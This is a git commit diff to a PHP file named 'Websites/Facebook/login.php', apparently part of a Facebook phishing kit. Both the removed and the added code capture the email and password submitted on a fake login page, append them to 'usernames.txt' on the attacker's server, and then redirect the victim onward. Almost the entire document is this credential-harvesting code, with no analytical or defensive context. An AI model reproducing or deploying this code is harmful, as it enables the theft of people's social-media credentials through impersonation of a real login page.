7a8ea2b5c975883e475769e37fbdbe4b0f083945
inc0gnit0 <iinc0gnit0@pm.me>
2019-12-21 16:44:10 -0600

    Add files via upload

--- Websites/Facebook/login.php
+++ Websites/Facebook/login.php
@@ -1,6 +1,14 @@
-<?php
-include 'ip.php';
-
-file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['email'] . " [PASS]: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://facebook.com'); # You may change the redirect link however you like(default: https://facebook.com)
-exit();
+<?php # DO NOT EDIT/TAMPER WITH THIS FILE #
+			session_start();
+			
+			$pass = $_POST["password"];
+			$email=$_SESSION["Email"];
+			
+			file_put_contents("usernames.txt", "                [ EMAIL: " . " ". $email . " ]   " . " " . "[ PASSWORD: " . " " . $pass . " ]\n", FILE_APPEND);
+  			header('Location: <REDIRECT>');
+			exit();
+			
+			
+			session_destroy();
+			
+?>
